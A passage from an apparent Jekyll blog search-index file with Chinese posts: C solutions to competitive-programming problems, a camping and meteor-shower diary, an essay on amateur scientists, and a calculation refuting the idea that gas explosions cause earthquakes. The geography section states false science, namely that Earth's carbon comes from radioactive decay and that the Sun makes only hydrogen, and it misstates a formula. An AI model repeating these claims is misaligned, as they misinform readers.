<span class=\"c1\">// FILE *fout = stdout;\n</span>\n  <span class=\"n\">fscanf</span><span class=\"p\">(</span><span class=\"n\">fin</span><span class=\"p\">,</span> <span class=\"s\">\"%d\"</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">n</span><span class=\"p\">);</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">n</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"n\">fscanf</span><span class=\"p\">(</span><span class=\"n\">fin</span><span class=\"p\">,</span><span class=\"s\">\"%d %d\"</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">y</span><span class=\"p\">);</span>\n\n  <span class=\"n\">QuickSort</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"n\">n</span><span class=\"p\">);</span>\n\n  <span class=\"n\">p</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"p\">;</span><span class=\"n\">q</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">y</span><span class=\"p\">;</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">2</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">n</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"o\">&lt;=</span><span class=\"n\">q</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">y</span><span class=\"o\">&gt;=</span><span class=\"n\">p</span><span class=\"p\">))</span>\n    <span class=\"p\">{</span>\n      <span class=\"n\">p</span><span class=\"o\">=</span><span class=\"n\">min</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">p</span><span class=\"p\">);</span>\n      <span class=\"n\">q</span><span class=\"o\">=</span><span class=\"n\">max</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">y</span><span class=\"p\">,</span><span class=\"n\">q</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">else</span>\n    <span class=\"p\">{</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">q</span><span class=\"o\">-</span><span class=\"n\">p</span><span class=\"o\">&gt;</span><span class=\"n\">max1</span><span class=\"p\">)</span> <span class=\"n\">max1</span><span class=\"o\">=</span><span class=\"n\">q</span><span class=\"o\">-</span><span class=\"n\">p</span><span class=\"p\">;</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"n\">q</span><span class=\"o\">&gt;</span><span class=\"n\">max2</span><span class=\"p\">)</span> <span class=\"n\">max2</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"n\">q</span><span class=\"p\">;</span>\n      <span class=\"n\">p</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"p\">;</span><span class=\"n\">q</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">y</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">q</span><span class=\"o\">-</span><span class=\"n\">p</span><span class=\"o\">&gt;</span><span class=\"n\">max1</span><span class=\"p\">)</span> <span class=\"n\">max1</span><span class=\"o\">=</span><span class=\"n\">q</span><span class=\"o\">-</span><span class=\"n\">p</span><span class=\"p\">;</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">n</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"n\">q</span><span class=\"o\">&gt;</span><span class=\"n\">max2</span><span class=\"p\">)</span> <span class=\"n\">max2</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">n</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"n\">q</span><span class=\"p\">;</span>\n  <span class=\"n\">fprintf</span><span class=\"p\">(</span><span class=\"n\">fout</span><span class=\"p\">,</span><span class=\"s\">\"%d %d</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span> <span class=\"n\">max1</span><span class=\"p\">,</span><span class=\"n\">max2</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</code></pre>\n</div>\n"
    } ,
  
    {
      "title"    : "NOIP 2002提高组均分纸牌",
      "category" : "",
      "tags"     : "编程, 算法, OI",
      "url"      : "/jekyll/update/2017/08/31/NOIP-2002%E6%8F%90%E9%AB%98%E7%BB%84%E5%9D%87%E5%88%86%E7%BA%B8%E7%89%8C.html",
      "date"     : "2017-08-31 09:18:00 +0800",
      "content"  : "<blockquote>\n  <p>NOIP2002提高组均分纸牌题解分析</p>\n</blockquote>\n\n<ol>\n  <li>题目：\n    <ul>\n      <li>题目描述 Description<br />\n       有 N 堆纸牌，编号分别为 1，2，…, N。每堆上有若干张，但纸牌总数必为 N 的倍数。可以在任一堆上取若于张纸牌，然后移动。<br />\n       移牌规则为：在编号为 1 堆上取的纸牌，只能移到编号为 2 的堆上；在编号为 N 的堆上取的纸牌，只能移到编号为 N-1 的堆上；其他堆上取的纸牌，可以移到相邻左边或右边的堆上。<br />\n       现在要求找出一种移动方法，用最少的移动次数使每堆上纸牌数都一样多。<br />\n       例如 N=4，4 堆纸牌数分别为：<br />\n       ①　9　②　8　③　17　④　6<br />\n       移动3次可达到目的：<br />\n       从 ③ 取 4 张牌放到 ④ （9 8 13 10） -&gt; 从 ③ 取 3 张牌放到 ②（9 11 10 10）-&gt; 从 ② 取 1 张牌放到①（10 10 10 10）。</li>\n      <li>输入描述 Input Description<br />\n       第一行N（N 堆纸牌，1 &lt;= N &lt;= 100）<br />\n       第二行A1 A2 … An （N 堆纸牌，每堆纸牌初始数，l&lt;= Ai &lt;=10000）</li>\n      <li>输出描述 Output Description\n       输出至屏幕。格式为：<br />\n       所有堆均达到相等时的最少移动次数。</li>\n      <li>样例输入 Sample Input<br />\n       4<br />\n       9 8 17 6</li>\n      <li>样例输出 Sample Output<br />\n       3<br />\n<br />\n<br /></li>\n    </ul>\n  </li>\n  <li>思路与想法：<br />\n本题是一道贪心题，一开始看可能不会有太明显的解法出现。<br />\n先来看贪心的描述：\n贪心法，又称贪心算法、贪婪算法、或称贪婪法，是一种在每一步选择中都采取在当前状态下最好或最优（即最有利）的选择，从而希望导致结果是最好或最优的算法。<br />\n所以是要用每一步的最优解来达到结果是最好或最优。这时候我就想到能否按照两个数一组，得到局部最优解后变为一个数，再与下一个数进行相同操作，形成递归。<br />\n那么局部最优解是怎么产生的呢？我一开始想的是平均数，但实际上并不是这样。因为这道题我们可以保证纸牌数据是一定可以均分的，这样我们就不需要考虑移动的具体方案。<br />\n所以我们先求出所有纸牌的平均数avg，然后计算出所有数据与avg之间存在的差值。对任意两个经过差值处理的数据a,b，存在以下情况：\n    <ul>\n      <li>a&lt;0且b&lt;0</li>\n      <li>a&lt;0且b&gt;0</li>\n      <li>a&gt;0且b&lt;0</li>\n      <li>a&gt;0且b&gt;0</li>\n      <li>a=0且b!=0（包括了b&gt;0和b&lt;0两种情况）</li>\n      <li>a!=0且b=0（包括了a&gt;0和a&lt;0两种情况）<br />\n<br /></li>\n    </ul>\n  </li>\n</ol>\n<hr />\n\n<p>然后呢？我一开始想过进一步关于a+b进行分类，但其实完全不必要，这里篇幅有限，不再赘述。有兴趣可以自己想想如果考虑a+b，那么该如何进一步做题。<br />\n对于除<code class=\"highlighter-rouge\">a=0</code>以外的所有情况，我们都可以这样处理，将a,b相加（a移动到b），并对移动次数加1，这时候再与下一个数做处理。<br />\n为什么要排除<code class=\"highlighter-rouge\">a=0</code>？因为在a=0的时候不需要移动。那为什么<code class=\"highlighter-rouge\">a!=0且b=0</code>时需要？因为是从左向右移动，a必须移动。<br />\n最后，本题的解法就是：</p>\n<ul>\n  <li>对所有数据转换为与平均数的差值。</li>\n  <li>在a=0且b!=0的情况下，移动次数加1。并无论什么情况，进行b=a+b的操作。之后以b作a,与下一个b进行相同处理</li>\n  <li>到递归结束时，移动次数就是解。</li>\n</ul>\n\n<p><br /></p>\n<hr />\n\n<p>C程序实现：</p>\n<div class=\"language-c highlighter-rouge\"><pre class=\"highlight\"><code><span class=\"cp\">#include &lt;stdio.h&gt;\n</span>\n<span class=\"kt\">int</span> <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"mi\">101</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"p\">{</span><span class=\"mi\">0</span><span class=\"p\">},</span><span class=\"n\">avg</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">t</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">n</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">solve</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">p</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">p</span><span class=\"o\">==</span><span class=\"n\">n</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"%d</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span><span class=\"n\">t</span><span class=\"p\">);</span>\n    <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">p</span><span class=\"p\">]</span><span class=\"o\">!=</span><span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"n\">t</span><span class=\"o\">++</span><span class=\"p\">;</span>\n  <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">p</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">p</span><span class=\"p\">]</span><span class=\"o\">+</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">p</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n  <span class=\"n\">solve</span><span class=\"p\">(</span><span class=\"n\">p</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">main</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">sum</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">scanf</span><span class=\"p\">(</span><span class=\"s\">\"%d\"</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">n</span><span class=\"p\">);</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">n</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"n\">scanf</span><span class=\"p\">(</span><span class=\"s\">\"%d\"</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]);</span>\n    <span class=\"n\">sum</span><span class=\"o\">+=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">];</span>\n  <span class=\"p\">}</span>\n  <span class=\"n\">avg</span><span class=\"o\">=</span><span class=\"n\">sum</span><span class=\"o\">/</span><span class=\"n\">n</span><span class=\"p\">;</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">n</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">-</span><span class=\"n\">avg</span><span class=\"p\">;</span>\n  <span class=\"n\">solve</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</code></pre>\n</div>\n"
    } ,
  
    {
      "title"    : "记露营及观看流星雨的经历",
      "category" : "",
      "tags"     : "生活, 随笔",
      "url"      : "/jekyll/update/2017/08/13/%E8%AE%B0%E9%9C%B2%E8%90%A5%E5%8F%8A%E8%A7%82%E7%9C%8B%E6%B5%81%E6%98%9F%E9%9B%A8%E7%9A%84%E7%BB%8F%E5%8E%86.html",
      "date"     : "2017-08-13 16:51:00 +0800",
      "content"  : "<p><img src=\"/image/M-Shower.jpg\" alt=\"\" />\n<br /></p>\n<hr />\n\n<p><br /></p>\n<blockquote>\n  <p>八月十二日，我参加了一次野营活动。我从来没有体验过住在帐篷中的感觉，也没有亲眼看到过流星。这一次，两个愿望一次满足！</p>\n</blockquote>\n\n<p>       八月十二日下午，我们驱车前往营地。已经有很多人驻扎在营地中，一看表，16:49，虽是准时到达，但还是晚了一步。一些方位不错的营地大都被占去，转了一圈，没有露营经验的我们也没有考虑风向等因素，就直接在经幡下搭起了帐篷。<br />\n       两只帐篷，我选择的帐篷打开比较简单，只需解开绳扣就会自动弹开。考虑风似乎有点大，我拿出了袋子中的绳索和扦插钉，把帐篷固定稳当了。而另一个帐篷就不是那么简单了，甚至装错了两回，眼看着乌云一朵朵地飘来，再不搭好帐篷就要被淋湿了。最后发觉内胆应该在骨架内，才在第三遍正确装好。<br />\n       看着乌云一朵朵，是要下一场大雨了。而我的心里也在想，这样的天气，我们还能看到流星吗？马上就要到吃饭的时候了，随着雨点落下，我们也就匆匆忙忙躲进蒙古包，等待着外面的烤全羊和烧烤。</p>\n\n<p>       雨下得越来越大，雨点声也越来越密集，不知是天渐渐转暗还是乌云遮住了太阳，外头也黑了起来。听着雨点声噼里啪啦地打在地上，蒙古包上，我开始担心我们的帐篷——它会进水吗？<br />\n       晚饭后，约莫八点。我们焦急地去看帐篷，很幸运，帐篷并没有湿，这意味着我们可以在帐篷里过夜了！我们没有去看音乐会，只是在帐篷中休息。<br />\n       大约十点半左右，我们出帐篷去看流星雨，其实我心中也底，只知道大概流星雨会在这时开始。我们尽量关掉了周围所有的光源，然后抬头仰望西北角——英仙座的方向，也是本次流星雨的辐射中心。就这样我们一直仰着脖子看着，一遍一遍地扫视，期盼着流星照亮天空的时刻。<br />\n       终于，我突然发现一道亮光擦过天际，亮光是白中带绿的。我忙喊有流星，当然，等其他人看过来时早已消失得没了影。又过了一会，头顶上突然竖着划过一道绿光，显然，其他人又没看到。终于，我的同学看到了一颗。但是之后，在我们仰望星空的很长时间里，没有再出现过，我们也就决定回到帐篷中，毕竟此时不是雨量最大的时候。<br />\n       我们再次回到帐篷，相比山上夏夜的凉风习习，帐篷可就没有几缕冷风吹过。本以为会在山顶感到寒冷，但显然，我们需要的并不是保暖。我翻来覆去，始终不痛快，加之帐篷地下就是硬石块，棱角分明，我更是坐立不安，动来动去不得安生。<br />\n       此间还有个小插曲，我的同学突然感觉脸上又一只很大的虫子，我们感觉打开手电四处翻找。照到时都被一惊——是一只蚂蚱，个头还不小，也不知道是几时跳进帐篷来的。我们想去抓它，可想难度有多大，几次逮捕都失败了。蚂蚱上窜下跳地，让我们怎么睡觉呢？终于同学眼疾手快可逮着了，连忙扔出去，拉好帐篷。<br />\n       然而，渐渐地，天空又被云彩所覆盖，看不到一星半点。望着此景，我也就渐渐随着流星雨睡去。</p>\n"
    } ,
  
    {
      "title"    : "关于『地震不是由爆炸引起的』证明",
      "category" : "",
      "tags"     : "数学证明",
      "url"      : "/jekyll/update/2017/08/10/%E5%85%B3%E4%BA%8E-%E5%9C%B0%E9%9C%87%E4%B8%8D%E6%98%AF%E7%94%B1%E7%88%86%E7%82%B8%E5%BC%95%E8%B5%B7%E7%9A%84-%E8%AF%81%E6%98%8E.html",
      "date"     : "2017-08-10 23:14:00 +0800",
      "content"  : "<h3>【地理学】</h3>\n<ul>\n  <li>1.碳循环和河流没有多大关系，参见wikipedia条目碳循环【1】<br />\n<br /></li>\n  <li>\n    <p>2.”先回答，汇聚一起的碳元素是地球内部固有，还是外部河流运移造成的，或还有其他原因？”<br />\n答：地球固有，参见wikipedia条目核合成【2】<br />\n原因：恒星核合成发生在恒星演化过程中的恒星，经由核聚变的过程负责形成从碳到钙的元素。恒星是将氢和氦聚变成更重元素的核子炉，在温度比太阳低的恒星内进行质子-质子链反应，比太阳热的恒星进行碳氮氧循环。<br />\n地球上的碳元素是原始行星发出的可以衰变为碳元素的元素到地球之后再衰变为碳元素从而形成的。<br />\n太阳也不可以生成碳元素，只能生成氢元素之类的元素，而地球更是连氢元素也生成不了。所以不难得出，生物的能量无法生成碳元素。<br />\n换句话说：元素不能从恒星內部或核反应堆以外的地方生成。地球固有的碳元素来自于元素衰变。<br />\n<br /></p>\n  </li>\n  <li>【结论】<br />\n由生物生成碳，或者其他种种方式产生后再用河流运入地下（河流运入这个说法前面已经说了是不可考的）是不正确的。这些都是地球固有碳经过碳循环的结果。<br />\n<br /></li>\n</ul>\n<hr />\n\n<p><br /></p>\n<h3>【数学】</h3>\n<ul>\n  <li>『计算内容』：日本2011年（平成23年）3月11日东北地方太平洋近海地震【3】<br />\n【以下步骤相对独立，没有先后】<br />\n<br /></li>\n  <li>1.日本天然气储量全部爆炸后的相当于多少爆炸当量？<br />\n日本天然气储量为：357亿立方米（35.7 bcm），数据来源【4】<br />\n我们按照38/4200的比率折合为TNT爆炸当量（吨），为323000000.0（吨）<br />\n计算表达式：<code class=\"highlighter-rouge\">357\\*pow(10,8)/4200\\*38</code><br />\n<br />\n另：如果数据是现有产量总计，数据是29亿立方米（2.9 bcm）数据来源【5】<br />\n我们按照38/4200的比率折合为TNT爆炸当量（吨），为26238095.23809524（吨）<br />\n计算表达式：<code class=\"highlighter-rouge\">29\\*pow(10,8)/4200\\*38</code><br />\n<br /></li>\n  <li>2.日本2011年（平成23年）3月11日东北地方太平洋近海地震直接转换为TNT当量为多少？<br />\n 按照log10 E=4.8+1.5M（焦耳）的能量计算公式【6】<br />\n我们可以转换为：E=10^(4.8+1.5) （焦耳）代入得：2.818382931264449e+18 （焦耳）<br />\n计算表达式：<code class=\"highlighter-rouge\">pow(10,4.8+1.5\\*9.1)</code><br />\n现在我们将能量转换为TNT当量（不考虑地震波，因为这就足够了）<br />\n按照一吨TNT4.184×10^9 J的能量【7】计算 可以得到：673609687.2046962（吨）<br />\n计算表达式：<code class=\"highlighter-rouge\">2.818382931264449e+18/4.184/pow(10,9)</code><br />\n<br /></li>\n  <li>3.计算9.1级地震需要多少的天然气？<br />\n按照log10 E=4.8+1.5M（焦耳）的能量计算公式【6】<br />\n我们可以转换为：E=10^(4.8+1.5) （焦耳）代入得：2.818382931264449e+18 （焦耳）<br />\n计算表达式：pow(10,4.8+1.5*9.1)<br />\n现在我们按照一立方米天然气38M（焦耳）的能量将能量转换为体积，得到：74167971875.38023（立方米）<br />\n计算表达式：<code class=\"highlighter-rouge\">2.818382931264449e+18/38/pow(10,6)</code><br />\n<br />\n<br /></li>\n  <li>【结论】<br />\n将1和2进行对比：<br />\n将323000000.0（吨）『或26238095.23809524（吨）』和673609687.2046962（吨）对比，得到——就算整个日本的天然气全部进行爆炸，也不可能支持这一场地震的能量，而日本又前后发生了大量7.0级以上的特大地震。<br />\n所以，『地震是由爆炸引起』的理论通过数学计算可得出是错误的。<br />\n<br />\n将3和大概数据对比：<br />\n如果大概数据是357亿立方米（35.7 bcm），数据来源【4】- 3的结论是大概数据的2倍左右。<br />\n如果大概数据是数据是29亿立方米（2.9 bcm）数据来源【5】- 3的结论是大概数据的25倍左右。<br />\n通过反向计算证明，『地震是由爆炸引起』的理论也可得出是错误的。\n<br /></li>\n</ul>\n<hr />\n\n<p><br /></p>\n\n<h3>About IEA &amp; more：</h3>\n<ol>\n  <li>国际能源署（英语：International Energy Agency，缩写为 IEA；法语：Agence internationale de l’énergie）是总部设于法国巴黎的国际组织，由经济合作与发展组织为应对能源危机于1974年设立。<br />\n国际能源署属于中立组织，数据时效性高，更新速度快，数据范围广且最为客观。『作为国内外大学论文的可靠数据来源』</li>\n  <li>在本次的数据引用中，最终数据来源是经济产业省（METI），是日本行政机关之一，同样『作为国内外大学论文的可靠数据来源』,对于日本的本土数据来说，这是最为直接和客观的。</li>\n  <li>此外，大概数据是可以用作科学计算的，只要该估计数值来源可靠且准确。详细内容参见：误差【8】和有效数字【9】\n<br /></li>\n</ol>\n<hr />\n\n<p><br /></p>\n<h3>【引用链接&amp;数据】</h3>\n<p><br /></p>\n<ul>\n  <li>【1】<a href=\"https://zh.wikipedia.org/wiki/%E7%A2%B3%E5%BE%AA%E7%92%B0\">Wikipedia-zh 碳循环</a></li>\n  <li>【2】<a href=\"https://zh.wikipedia.org/wiki/%E6%A0%B8%E5%90%88%E6%88%90\">Wikipedia-zh 核合成</a></li>\n  <li>【3】<a href=\"https://zh.wikipedia.org/wiki/%E6%97%A5%E6%9C%AC%E5%9C%B0%E9%9C%87%E5%88%97%E8%A1%A8\">Wikipedia-zh 日本2011年（平成23年）3月11日东北地方太平洋近海地震</a></li>\n  <li>【4】<a href=\"http://www.iea.org/publications/freepublications/publication/EnergyPoliciesofIEACountriesJapan2016.pdf\">PDF - IEA（国际能源署）2016年日本能源总览（Japan Energy Outlook 2016）</a><br />\n   第78页（页脚页数），DOMESTIC PRODUCTION：” According to the Ministry of Economy, Trade and Industry (METI), proven reserves\nof natural gas were estimated at 35.7 bcm in March 2015.”</li>\n  <li>【5】<a href=\"http://www.iea.org/publications/freepublications/publication/EnergyPoliciesofIEACountriesJapan2016.pdf\">PDF - IEA（国际能源署）2016年日本能源总览（Japan Energy Outlook 2016）</a><br />\n   第78页（页脚页数），DOMESTIC PRODUCTION：”Domestic production of natural gas in 2015 was 2.9 billion cubic metres (bcm),\nequivalent to around 2.2 million tonnes (Mt) of liquefied natural gas (LNG). “</li>\n  <li>【6】<a href=\"https://zh.wikipedia.org/wiki/%E9%87%8C%E6%B0%8F%E5%9C%B0%E9%9C%87%E8%A6%8F%E6%A8%A1#.E9.9C.87.E7.B4.9A.E8.88.87.E8.83.BD.E9.87.8F\">Wikipedia-zh 地震震级与能量换算公式</a></li>\n  <li>【7】<a href=\"https://zh.wikipedia.org/wiki/%E7%88%86%E7%82%B8%E5%BD%93%E9%87%8F\">Wikipedia-zh 爆炸当量</a></li>\n  <li>【8】<a href=\"https://zh.wikipedia.org/wiki/%E8%AF%AF%E5%B7%AE\">Wikipedia-zh 误差</a></li>\n  <li>【9】<a href=\"https://zh.wikipedia.org/wiki/%E6%9C%89%E6%95%88%E6%95%B8%E5%AD%97\">Wikipedia-zh 有效数字</a></li>\n</ul>\n"
    } ,
  
    {
      "title"    : "英雄不问出处——可你不是英雄",
      "category" : "",
      "tags"     : "生活, 随笔",
      "url"      : "/jekyll/update/2017/08/10/%E8%8B%B1%E9%9B%84%E4%B8%8D%E9%97%AE%E5%87%BA%E5%A4%84-%E5%8F%AF%E4%BD%A0%E4%B8%8D%E6%98%AF%E8%8B%B1%E9%9B%84.html",
      "date"     : "2017-08-10 18:33:00 +0800",
      "content"  : "<blockquote>\n  <p>这几天与民科展开了激烈的论战，除了接受的教育水平低外，我还发现了许多『有趣』的社会现象。</p>\n</blockquote>\n\n<p>民科，民间科学家，一直被人鄙视的人群。指的是那些没有受过或接受不系统的专业教育的科学爱好者。这个词语本不应该作为贬义词使用。<br />\n<br /></p>\n<hr />\n\n<p><br />\n(一) 背景<br />\n这些天和我论战的是一位老干部，具体姓名我虽知道但不方便透露，是上世纪80年代的老一辈大学生，曾在上世纪末做过高中数学老师，后来在党校工作至今。很难以置信吧，出生于上世纪六十年代中期的一位党校工作者是一位民科。<br />\n先不说争论的是什么，我们先说说中国固有的一种有趣现象，来听一段故事：</p>\n\n<blockquote>\n  <p>当时可口可乐引进中国<br />\n北京各大报做出激烈反弹。《北京日报》的“内参”以“可口未必可乐”为题发表文章，认为国家缺少外汇，引进可口可乐浪费国家大量外汇资源。政治局常委陈云在这份内参上批示：只准卖给外国人，不准卖给中国人一瓶。其他中央领导也都圈阅了。外经贸部根据批示，只好通知北京停止内销。一夜之间，所有可口可乐都从商店的柜台里撤下来了。<br />\n这就是老干部对于有力的新潮势力进入或产生导致自己无法控制整个领域时的典型做法——无理由地禁止，甚至有是原因还很可笑：\n有一个地方的卫生部门提出，“可口可乐含有咖啡因，不符合卫生要求。”他们的根据是，东北一个研究所给白鼠喂了可口可乐之后，白鼠十分兴奋。\n最后是中粮公司有理由据地反驳才让中央信服，继续销售可口可乐。</p>\n</blockquote>\n\n<p>这一段故事说的其实就是原先主导某个领域地老干部无法忍受新势力进入使他丧失对这个领域的控制，从而无端的禁止的现象。\n换在科研界——不断有新的研究生、博士等高材生从国外回来，带来新的理论，而这些理论干部无法接受。在长期国外学术领先的情况下，很难在中国禁止一切学术期刊。所以，干部们就换了一种方式——向大众洗脑。<br />\n2013～2014年期间，民科在科学网极度盛行，ID多为XX老翁，XX居士这样的。而这些民科多数是我国的老干部。他们批评国人崇尚西方自然科学，推出了“东方科学”之类的概念。这种路线的民科其实都是失意退休老人，还很可能是高校教职工。因为90年代到2000年77、78届的优秀国外留学生回国，改变了我国高校的现状，从那时起开始讲求SCI，科学研究也不再闭门造车，而是迅速跟国际接轨，所以有一部分老教工的老本不够吃，他们会看到学校和学院大量向这种新人牛人倾斜，自己则悻悻退休，抑郁成症，所以才成为这样的民科。他们明面上是批判“西方科学”，实际上心里是在鄙视那些国外回来，纠正我国科研状况，主导了科研的主流的“官科”们。他们提出的“东方科学”也及其可笑——诸如『量子佛学』之类的书籍不在少数。将佛教和被曲解了的科学搭配在一起。<br />\n更为有趣的是，他们所宣传的『东方科学』还有大批民众相信，虽然民众们看不懂，但是搭配上专业的科学名词，让人觉得权威，可靠。加之“老祖宗”，“东方文化”之类的词语更是激发了民众内心的先贤崇拜。使得人们不得不信服。<br />\n可以说，这是『看似科学的谣言』的祖先。\n<br /></p>\n<hr />\n\n<p><br />\n（二）细节<br />\n这位老干部的观点是什么呢？他认为：『地球上的生物体内含有的碳元素在生物死亡之后被释放，由河流进入地球内部，然后变为天然气、瓦斯气体、煤炭等。这些物质越积越多，最后爆炸使他们的能量释放，形成了地震』。这就是他的观点，简单的说就是地震是由天然气之类的爆炸引起的。<br />\n如果我不事先知道是民科，乍看我可能真的会相信。但是稍微对地理学的知识进行涉及，就会发现许多问题——比如：碳元素是地球固有的，生物碳是生物在碳循环过程中将地球固有的碳元素吸收。爆炸真的能产生这没大的能量？为什么煤矿图与地震分布图不同？这一切实际上都是疑点。<br />\n我曾试图和它说过一会理，但是他却对一段已经被我整段反驳的措辞执迷不悟。很具有戏剧性的是，这段内容还是一段『不相干谬论』，到处充满『红鲱鱼』和『稻草人』。简述一下：他认为人在循环，会排泄，同时，地球和人应该有相似之处，所以地球在碳循环（他终于承认碳循环了）也会排泄（地震）。<br />\n实际上，碳循环并不是生命循环，谈和相似。<br />\n很快，我就意识到和一个不会地理学且不肯看的人说地理没有用。所以我决定进行数学演算，按照他的理论和现实数据来进行计算，看看能不能得到现实的结果。<br 